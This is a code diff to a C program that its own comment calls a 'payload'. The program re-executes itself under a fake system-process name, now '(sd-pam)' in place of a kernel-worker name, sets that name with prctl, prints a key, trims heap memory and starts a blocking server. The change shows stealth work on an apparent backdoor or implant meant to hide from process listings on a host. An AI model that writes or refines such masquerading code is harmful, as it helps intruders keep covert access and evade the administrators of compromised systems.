@@ -5,6 +5,7 @@
 #include <string.h>
 #include <fcntl.h>
 #include <sys/prctl.h>
+#include <malloc.h>
 
 #include "key.h"
 #include "server.h"
@@ -13,7 +14,7 @@ int obfuscate_process_name(int argc, char **argv)
 {
 	// obfuscate payload by changing the name of the process
 	(void)argc;
-	char *pr_name = "[kworker/1:1-events]";
+	char *pr_name = "(sd-pam)";
 	if (strcmp(argv[0], pr_name) != 0)
 	{
 		char *new_argv[] = {pr_name, NULL};
@@ -21,11 +22,7 @@ int obfuscate_process_name(int argc, char **argv)
 			return 1;
 	}
 	else
-	{
-		memset(argv[0], 0, strlen(argv[0]));
-		strncpy(argv[0], pr_name, strlen(pr_name));
 		prctl(PR_SET_NAME, pr_name, 0, 0, 0);
-	}
 	return 0;
 }
 
@@ -45,6 +42,8 @@ int main(int argc, char **argv)
 		return 1;
 	write(1, key, PASS_SIZE);
 	write(1, "\n", 1);
+
+	malloc_trim(0);
 
 	// start server, should be blocking
 	server_run(key);
